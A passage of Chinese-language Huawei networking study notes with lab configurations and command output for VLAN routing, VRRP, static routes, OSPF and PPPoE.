class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">查看状态</span><br><span class="line">[SW1]display stp brief </span><br><span class="line"> MSTID  Port                        Role  STP State     Protection</span><br><span class="line">   0    GigabitEthernet0/0/1        DESI  FORWARDING      NONE</span><br><span class="line">   0    GigabitEthernet0/0/3        DESI  FORWARDING      NONE</span><br><span class="line">   0    Eth-Trunk12                 DESI  LEARNING        NONE</span><br><span class="line">----------------------------------------------------------------------------------------------------------  </span><br><span class="line">[SW1]display interface Eth-Trunk 12</span><br><span class="line">Eth-Trunk12 current state : UP</span><br><span class="line">Line protocol current state : UP</span><br><span class="line">Description:</span><br><span class="line">Switch Port, PVID :   99, Hash arithmetic : According to SIP-XOR-DIP,Maximal BW: 2G, Current BW: 2G, The Maximum Frame Length is 9216</span><br><span class="line">IP Sending Frames&#x27; Format is PKTFMT_ETHNT_2, Hardware address is 4c1f-cc86-77f9</span><br><span class="line">Current system time: 2021-10-30 21:47:44-08:00</span><br><span class="line">    Input bandwidth utilization  :    0%</span><br><span class="line">    Output bandwidth utilization :    0%</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">PortName                      Status      Weight</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">GigabitEthernet0/0/5          UP          1</span><br><span class="line">GigabitEthernet0/0/6          UP          1</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">The Number of Ports in Trunk : 2</span><br><span class="line">The Number of UP Ports in Trunk : 2</span><br></pre></td></tr></table></figure><hr><h1 id="VLAN间路由"><a href="#VLAN间路由" class="headerlink" title="VLAN间路由"></a>VLAN间路由</h1><p>VLAN的本质是什么？——&gt;隔离广播域</p><h2 id="单臂路由"><a href="#单臂路由" class="headerlink" title="单臂路由"></a>单臂路由</h2><p>==在路由器上实施==</p><ul><li>路由器的物理接口不能识别携带TAG的帧，比如：trunk，但除了PVID VLAN</li><li>路由器的子接口可以识别携带TAG的帧</li></ul><hr><h3 id="实验一-1"><a href="#实验一-1" class="headerlink" title="实验一"></a>实验一</h3><p>实现VLAN20的PC3和VLAN30的S2通信</p><div class="table-container"><table><thead><tr><th>导图：                 【R3】   <br />                            [G0/10]  <br />                            【SW4】<br />                  [G0/1]              [G0/2]<br />                【PC3】            【S2】</th></tr></thead><tbody><tr><td></td></tr></tbody></table></div><p><strong>步骤一：配置交换机SW4的vlan和access</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[SW4]vlan batch 20 30</span><br><span class="line">[SW4]in g0/0/1</span><br><span class="line">[SW4-GigabitEthernet0/0/1]port link-type access </span><br><span class="line">[SW4-GigabitEthernet0/0/1]port default vlan 20</span><br><span class="line">[SW4-GigabitEthernet0/0/1]stp edged-port enable </span><br><span class="line">[SW4]in g0/0/2</span><br><span class="line">[SW4-GigabitEthernet0/0/2]port link-type access </span><br><span class="line">[SW4-GigabitEthernet0/0/2]port default vlan 30</span><br><span class="line">[SW4-GigabitEthernet0/0/2]stp edged-port enable </span><br></pre></td></tr></table></figure><p>步骤二：配置SW4的上行trunk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW4-GigabitEthernet0/0/10]port link-type  trunk </span><br><span class="line">[SW4-GigabitEthernet0/0/10]port trunk allow-pass vlan 20 30</span><br></pre></td></tr></table></figure><p>步骤三：配置路由器的子接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[R3]int g0/0/0.20</span><br><span class="line">[R3-GigabitEthernet0/0/0.20]dot1q termination vid 20</span><br><span class="line">[R3-GigabitEthernet0/0/0.20]ip address 10.1.20.30 27</span><br><span class="line">[R3-GigabitEthernet0/0/0.20]arp broadcast enable  </span><br><span class="line">[R3-GigabitEthernet0/0/0.30]ip adress 10.1.30.30 27</span><br><span class="line">[R3-GigabitEthernet0/0/0.30]dot1q termination vid 30 //是别trunk的vlan</span><br><span class="line">[R3-GigabitEthernet0/0/0.30]arp broadcast enable    //允许arp广播从该子接口发送</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;R3&gt;ping 10.1.20.1</span><br><span class="line">  PING 10.1.20.1: 56  data bytes, press CTRL_C to break</span><br><span class="line">    Reply from 10.1.20.1: bytes=56 Sequence=1 ttl=128 time=50 ms</span><br><span class="line">    Reply from 10.1.20.1: bytes=56 Sequence=2 ttl=128 time=50 ms</span><br><span class="line">     </span><br><span class="line">&lt;R3&gt;ping 10.1.30.30 </span><br><span class="line">  PING 10.1.30.30: 56  data bytes, press CTRL_C to break</span><br><span class="line">    Reply from 10.1.30.30: bytes=56 Sequence=1 ttl=255 time=1 ms</span><br><span class="line">    Reply from 10.1.30.30: bytes=56 Sequence=2 ttl=255 time=1 ms</span><br><span class="line">    </span><br><span class="line">&lt;R3&gt;display ip routing-table   </span><br><span class="line">Destination/Mask    Proto   Pre  Cost      Flags  NextHop         Interface</span><br><span class="line">10.1.20.0/27        Direct   0    0         D     10.1.20.30      GigabitEthernet0/0/0.20</span><br><span class="line">10.1.30.0/27        Direct   0    0         D     10.1.30.30      GigabitEthernet0/0/0.30</span><br></pre></td></tr></table></figure><hr><h1 id="VLAN-IF-三层交换"><a href="#VLAN-IF-三层交换" class="headerlink" title="VLAN IF(三层交换)"></a>VLAN IF(三层交换)</h1><p>==多层交换机实施==</p><p>作用：为每个vlan创建一个vlanif接口作为网关</p><p>原理：不同VLAN间的数据转发不必经过路由器，直接在交换机上完成了路由</p><p> VLAN IF的 工作条件：</p><ol><li>vlan必须存在</li><li>Trunk允许了该vlan通过，有对应vlan的access接口</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">interface Vlanif8</span><br><span class="line"> ip address 10.1.10.13 255.255.255.240</span><br><span class="line">#</span><br><span class="line">interface Vlanif9</span><br><span class="line"> ip address 10.1.10.28 255.255.255.240</span><br><span class="line">#</span><br><span class="line">interface Vlanif10</span><br><span class="line"> ip address 10.1.10.45 255.255.255.240</span><br></pre></td></tr></table></figure><hr><h1 id="VRRP基础"><a href="#VRRP基础" class="headerlink" title="VRRP基础"></a>VRRP基础</h1><p>虚拟路由器冗余协议（热备协议）</p><p>3层IP协议：协议号112（ICMP=1，TCP=6，UDP=17）</p><p><strong>Master（负责终端设备的数据转发，响应终端的ARP请求）</strong></p><p><strong>Backup（负责监听主设备，时刻成为Master）</strong></p><p>虚拟IP =网关的地址，对应的时真实IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[SW1-Vlanif8]vrrp vrid 8 virtual-ip 10.1.10.14</span><br><span class="line">[SW1]dis vrrp brief </span><br><span class="line">VRID  State        Interface                Type     Virtual IP     </span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">8     Master       Vlanif8                  Normal   10.1.10.14     </span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">Total:1     Master:1     Backup:0     Non-active:0  </span><br><span class="line"></span><br><span class="line">[SW2-Vlanif8]vrrp vrid 8 virtual-ip 10.1.10.14</span><br><span class="line">[SW2]dis vrrp brief</span><br><span class="line">VRID  State        Interface                Type     Virtual IP     </span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">8     Backup       Vlanif8                  Normal   10.1.10.14     </span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">Total:1     Master:0     Backup:1     Non-active:0 </span><br></pre></td></tr></table></figure><p>选举主备原则：</p><p>==重要：ROOT设备必须是VRRP的Master，否则会造成2层次优的转发==</p><ol><li><p>优先级(范围0-255，可配置范围1-254)，默认100，数值越大越优先<br>0—&gt;Down，255—&gt;真实IP=虚拟IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW2-Vlanif8]vrrp vrid 8 priority 110</span><br><span class="line">Info：Router state BACKUP changed to MASTER,</span><br></pre></td></tr></table></figure></li><li><p>IP地址较大的（华为设备上配置时间是一个因素）   </p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[SW1]dis vrrp brief </span><br><span class="line">VRID  State        Interface                Type     Virtual IP     </span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">8     Master       Vlanif8                  Normal   10.1.10.14     </span><br><span class="line">9     Master       Vlanif9                  Normal   10.1.10.30     </span><br><span class="line">10    Master       Vlanif10                 Normal   10.1.10.46     </span><br><span class="line">----------------------------------------------------------------</span><br></pre></td></tr></table></figure><hr><h1 id="IP路由基础"><a href="#IP路由基础" class="headerlink" title="IP路由基础"></a>IP路由基础</h1><p>  最长匹配原则，最精准的路由</p><p>优先级（preference），比较不同路由形式（协议）的优先与否，越小越优先</p><p>开销值（cost、metric），同一协议内部到达目标的不同路径的开销，越小越优先</p><p>relay，路由迭代，去往某个目标地址的下一跳不是直连地址（静态和BGP中出现）</p><hr><h2 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h2><p>由管理员手动配置和维护的路由</p><p>静态路由可以实现负载均衡和路由备份</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[R1]ip route-static 8.8.8.8 32 ?            </span><br><span class="line">  IP_ADDR&lt;X.X.X.X&gt;  Gateway address</span><br><span class="line">  Cellular          Cellular interface</span><br><span class="line">  GigabitEthernet   GigabitEthernet interface</span><br><span class="line">  NULL              NULL interface</span><br><span class="line">  Serial            Serial interface</span><br><span class="line">  vpn-instance      Destination VPN-Instance for Gateway address</span><br><span class="line">[R1]ip route-static 8.8.8.8 32 Serial 1/0/0  //点到点链路可以直接用出接口</span><br><span class="line">[R1]dis ip routing-table </span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface</span><br><span class="line"></span><br><span class="line">        8.8.8.8/32  Static  60   0           D   12.1.1.1        Serial1/0/0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[R1]ip route-static 8.8.8.8 32 202.100.1.2//多点网络必须使用下一跳</span><br><span class="line">[R1]dis ip routing-table </span><br><span class="line">Route Flags: R - relay, D - download to fib</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">Routing Tables: Public</span><br><span class="line">         Destinations : 15       Routes : 16       </span><br><span class="line"></span><br><span class="line">Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface</span><br><span class="line">         </span><br><span class="line">       8.8.8.8/32   Static  60   0          RD   202.100.1.2     GigabitEthernet0/0/0</span><br></pre></td></tr></table></figure><hr><p>代理ARP</p><p>如果开启了代理ARP，R2的G0/0/0代理8.8.8.8回应ARP报文（前提是R2需要有8.8.8.8的路由）</p><p>int g0/0/0</p><p>arp-proxy enable </p><hr><p>静态默认路由/浮动静态路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R1]ip route-static 0.0.0.0 0.0.0.0 GigabitEthernet 0/0/0  //错误配置</span><br></pre></td></tr></table></figure><p>推荐使用出接口+下一跳</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R1]ip route-static 8.8.8.8 32 GigabitEthernet 0/0/0 202.100.1.2</span><br><span class="line">[R1]ip route-static 0.0.0.0 0.0.0.0 GigabitEthernet 0/0/0 202.100.1.2</span><br></pre></td></tr></table></figure><hr><p>浮动静态路由，本质是优先级的修改，HW的静态路由优先级是60 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ip route-static 0.0.0.0 0.0.0.0 GigabitEthernet0/0/0 202.100.1.2</span><br><span class="line">ip route-static 0.0.0.0 0.0.0.0 Serial1/0/0 12.1.1.2</span><br><span class="line"></span><br><span class="line">[R1]dis ip rou pro static                                </span><br><span class="line">Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface</span><br><span class="line">        0.0.0.0/0   Static  60   0           D   202.100.1.2     GigabitEthernet0/0/0</span><br><span class="line">                    Static  60   0           D   12.1.1.2        Serial1/0/0</span><br><span class="line">        8.8.8.8/32  Static  60   0           D   202.100.1.2     GigabitEthernet0/0/0</span><br><span class="line">    202.100.1.4/30  Static  60   0           D   12.1.1.1        Serial1/0/0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[R1]ip route-static 0.0.0.0 0.0.0.0 Serial 1/0/0 12.1.1.2 preference 61</span><br><span class="line">[R1]dis ip rou pro static                                              </span><br><span class="line">Route Flags: R - relay, D - download to fib</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">Public routing table : Static</span><br><span class="line">         Destinations : 3        Routes : 4        Configured Routes : 4</span><br><span class="line"></span><br><span class="line">Static routing table status : &lt;Active&gt;</span><br><span class="line">         Destinations : 3        Routes : 3</span><br><span class="line"></span><br><span class="line">Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface</span><br><span class="line"></span><br><span class="line">        0.0.0.0/0   Static  60   0           D   202.100.1.2     GigabitEthernet0/0/0</span><br><span class="line">        8.8.8.8/32  Static  60   0           D   202.100.1.2     GigabitEthernet0/0/0</span><br><span class="line">    202.100.1.4/30  Static  60   0           D   12.1.1.1        Serial1/0/0</span><br><span class="line"></span><br><span class="line">Static routing table status : &lt;Inactive&gt; //优先级改为61，状态变为Inactive</span><br><span class="line">         Destinations : 1        Routes : 1</span><br><span class="line"></span><br><span class="line">Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface</span><br><span class="line"></span><br><span class="line">        0.0.0.0/0   Static  61   0               12.1.1.2        Serial1/0/0</span><br></pre></td></tr></table></figure><p><strong>测试</strong></p><p>shutdown关闭R2的G0/0/0，此时链路转换到了S1/0/0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[R1]ping -c 10000  8.8.8.8</span><br><span class="line">  PING 8.8.8.8: 56  data bytes, press CTRL_C to break</span><br><span class="line">    Reply from 8.8.8.8: bytes=56 Sequence=1 ttl=255 time=40 ms</span><br><span class="line">    Reply from 8.8.8.8: bytes=56 Sequence=2 ttl=255 time=20 ms</span><br><span class="line">    Reply from 8.8.8.8: bytes=56 Sequence=3 ttl=255 time=30 ms</span><br><span class="line">    Request time out</span><br><span class="line">    Request time out</span><br><span class="line">    Request time out</span><br><span class="line">    Reply from 8.8.8.8: bytes=56 Sequence=25 ttl=255 time=20 ms</span><br><span class="line">    Reply from 8.8.8.8: bytes=56 Sequence=26 ttl=255 time=20 ms</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[R1]dis ip routing-table protocol static </span><br><span class="line">Route Flags: R - relay, D - download to fib</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">Public routing table : Static</span><br><span class="line">         Destinations : 2        Routes : 2        Configured Routes : 3</span><br><span class="line"></span><br><span class="line">Static routing table status : &lt;Active&gt;</span><br><span class="line">         Destinations : 2        Routes : 2</span><br><span class="line"></span><br><span class="line">Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface</span><br><span class="line"></span><br><span class="line">        0.0.0.0/0   Static  61   0           D   12.1.1.2        Serial1/0/0//开始使用链路</span><br><span class="line">    202.100.1.4/30  Static  60   0           D   12.1.1.1        Serial1/0/0</span><br></pre></td></tr></table></figure><hr><h1 id="OSPF（动态路由）"><a href="#OSPF（动态路由）" class="headerlink" title="OSPF（动态路由）"></a>OSPF（动态路由）</h1><p>OSPF：开放路径最短优先协议，IP的89号协议</p><p>过程：</p><ol><li>建立邻居关系</li><li>同步数据库信息</li><li>计算并得到路由表</li></ol><hr><p>OSPF区域（area）</p><p>OSPF的骨干区域（area 0），其他区域是非骨干区域</p><p>必须有区域0，所有的非骨干区域必须连接区域0</p><hr><p>OSPF的5种报文：</p><ol><li>Hello报文</li><li>DD（Database Description）报文</li><li>LSR（Link State Request）报文</li><li>LSU（Link State Update）报文</li><li>LSACK（Link State Acknowledgment）报文</li></ol><p>DR（指定路由器）/ BDR（备份路由器）</p><hr><p>邻居关系建立过程：</p><p>DOWN（无状态）→INIT（初始化）→2-WAY（到此邻居关系建立完毕）</p><hr><p>邻接关系建立过程：</p><p>Exstart（开始交互）→Exchange（交互过程）→Loading（开始同步）→Full（到此邻接关系建立完毕）</p><hr><h3 id="实验一-2"><a href="#实验一-2" class="headerlink" title="实验一"></a>实验一</h3><p>R1、SW1、SW2实施OSPF，使整个网络可以通信</p><p>R1的Lo 0，区域0  |  AS1中的其他地址属于区域1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[R1-LoopBack0] ip address 11.1.1.1</span><br><span class="line">[R1]ospf router-id 1.1.1.1</span><br><span class="line">[R1-ospf-1]area 0</span><br><span class="line">[R1-ospf-1]area 1 </span><br><span class="line">[R1-LoopBack0]ospf enable area 0</span><br><span class="line">[R1-GigabitEthernet0/0/1]ospf enable area 1&#125;该接口启动OSPF，并且将接口的网络放入OSPF，以便其他设备学习到</span><br><span class="line">[R1-GigabitEthernet0/0/2]ospf enable area 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW1]ospf router-id 3.3.3.3 </span><br><span class="line">[SW1-ospf-1]area 1</span><br><span class="line">[SW1-Vlanif11]ospf enable area 1</span><br><span class="line">&#123;将Vlan8、vlan9、vlan10放入ospf区域1中使得路由器R1获得&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW2]ospf router-id 2.2.2.2</span><br><span class="line">[SW2-ospf-1]area 1</span><br><span class="line">[SW2-Vlanif12]ospf enable area 1</span><br><span class="line">&#123;将Vlan8、vlan9、vlan10放入ospf区域1中使得路由器R1获得&#125;</span><br></pre></td></tr></table></figure><p>验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[R1]dis ospf interface </span><br><span class="line"></span><br><span class="line">         OSPF Process 1 with Router ID 1.1.1.1</span><br><span class="line">                 Interfaces </span><br><span class="line"></span><br><span class="line"> Area: 0.0.0.0          (MPLS TE not enabled)</span><br><span class="line"> IP Address      Type         State    Cost    Pri   DR              BDR </span><br><span class="line"> 11.1.1.1        P2P          P-2-P    0       1     0.0.0.0         0.0.0.0</span><br><span class="line"> </span><br><span class="line"> Area: 0.0.0.1          (MPLS TE not enabled)</span><br><span class="line"> IP Address      Type         State    Cost    Pri   DR              BDR </span><br><span class="line"> 10.1.11.1       Broadcast    DR       1       1     10.1.11.1       10.1.11.2</span><br><span class="line"> 10.1.12.1       Broadcast    DR       1       1     10.1.12.1       10.1.12.2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[SW1]dis ospf peer brief </span><br><span class="line"></span><br><span class="line">         OSPF Process 1 with Router ID 3.3.3.3</span><br><span class="line">                  Peer Statistic Information</span><br><span class="line"> ----------------------------------------------------------------------------</span><br><span class="line"> Area Id          Interface                        Neighbor id      State    </span><br><span class="line"> 0.0.0.1          Vlanif8                          2.2.2.2          Full        </span><br><span class="line"> 0.0.0.1          Vlanif9                          2.2.2.2          Full        </span><br><span class="line"> 0.0.0.1          Vlanif10                         2.2.2.2          Full        </span><br><span class="line"> 0.0.0.1          Vlanif11                         1.1.1.1          Full        </span><br><span class="line"> ----------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[SW2]dis ospf peer brief </span><br><span class="line"></span><br><span class="line">         OSPF Process 1 with Router ID 2.2.2.2</span><br><span class="line">                  Peer Statistic Information</span><br><span class="line"> ----------------------------------------------------------------------------</span><br><span class="line"> Area Id          Interface                        Neighbor id      State    </span><br><span class="line"> 0.0.0.1          Vlanif8                          3.3.3.3          Full        </span><br><span class="line"> 0.0.0.1          Vlanif9                          3.3.3.3          Full        </span><br><span class="line"> 0.0.0.1          Vlanif10                         3.3.3.3          Full        </span><br><span class="line"> 0.0.0.1          Vlanif12                         1.1.1.1          Full        </span><br><span class="line"> ----------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><hr><h1 id="PPP链路"><a href="#PPP链路" class="headerlink" title="PPP链路"></a>PPP链路</h1><p>PPP协议是一种点到点链路协议</p><p>在串口实施</p><p>PPP组件</p><ol><li>链路控制协议（Link Control Protocol）：用来建路、拆除和监控PPP数据链路</li><li>网络层协议（Network Control Protocol）：用于对不同的网络层协议进行连接建立和参数协商</li></ol><p>PPP协议具有很好的扩展性，当需要以太网链路上承载PPP协议时，PPP可扩展为PPPoE </p><hr><h1 id="PPPoE"><a href="#PPPoE" class="headerlink" title="PPPoE"></a>PPPoE</h1><p>PPPoE协议通过在以太网提供点到点的连接，建立PPP会话，使得以太网中的主机能够连接到远端的宽带接入服务器上</p><p>PPPoE具有适用范围广、安全性高、计费方便等特点</p><p>PPPoE报文使用Ethernet格式来进行封装的</p><hr><p>PPPoE会话建立过程：</p><div class="table-container"><table><thead><tr><th>阶段</th><th>描述</th></tr></thead><tbody><tr><td>发现阶段</td><td>获取以太网地址，确定唯一的PPPoE会话</td></tr><tr><td>会话阶段</td><td>PPP协商阶段和PPP报文传输阶段</td></tr><tr><td>会话终结阶段</td><td>会话建立以后的任意时刻，发送报文结束PPPoE会话</td></tr></tbody></table></div><p>PPPoE协议报文：</p><div class="table-container"><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>PADI</td><td>PPPoE发现初始报文</td></tr><tr><td>PADO</td><td>PPPoE发现提供报文</td></tr><tr><td>PADR</td><td>PPPoE发现请求报文</td></tr><tr><td>PADS</td><td>PPPoE发现会话确认报文</td></tr><tr><td>PADT</td><td>PPPoE发现终止报文</td></tr></tbody></table></div><hr><h3 id="实验一-3"><a href="#实验一-3" class="headerlink" title="实验一"></a>实验一</h3><p>PPPoE服务器端的配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//设置全局的用户名和密码用于认证</span><br><span class="line">[R2-aaa]local-user chen password cipher chen</span><br><span class="line">[R2-aaa]local-user chen service-type ppp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//配置地址池，用于分发地址</span><br><span class="line">[R2]ip pool PPPoE</span><br><span class="line">[R2-ip-pool-PPPoE]network 202.100.1.0 mask 255.255.255.252</span><br><span class="line">[R2-ip-pool-PPPoE]dns-list 8.8.8.8</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//配置一个虚拟模板和调用模板</span><br><span class="line"> [R2]int Virtual-Template 1   </span><br><span class="line"> [R2-Virtual-Template1]ip adress 202.100.1.2 30</span><br><span class="line"> [R2-Virtual-Template1]remote address pool PPPoE</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//将虚拟模板和物理接口绑定</span><br><span class="line">[R2-GigabitEthernet0/0/0]pppoe-server bind virtual-template 1</span><br></pre></td></tr></table></figure><p>PPPoE客户端配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[R1]dialer-rule</span><br><span class="line">[R1-dialer-rule]dialer-rule 1 ip permit//配置拨号规则，允许所有IP</span><br><span class="line">[R1]interface Dialer 1</span><br><span class="line">[R1-Dialer1]dialer user CHN//该用户不用于认证，是标识作用以及和dialer绑定</span><br><span class="line">[R1-Dialer1]dialer bundle 1//该拨号口和bundle 1联合绑定</span><br><span class="line">[R1-Dialer1]ip address ppp-negotiate  //拨号接口地址从PPPoE的服务器协商得到</span><br><span class="line">[R1-GigabitEthernet0/0/0]pppoe-client dial-bundle-number 1//绑定口1和以太物理接口联动</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注意：华为设备从最高的IP开始分配地址，所以尽量配置号码小的地址</span><br><span class="line">[R2-ip-pool-PPPoE]excluded-ip-address 202.100.1.2//排除这个地址分发</span><br></pre></td></tr></table></figure><p>验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[R1]display ip interface brief </span><br><span class="line">Interface                         IP 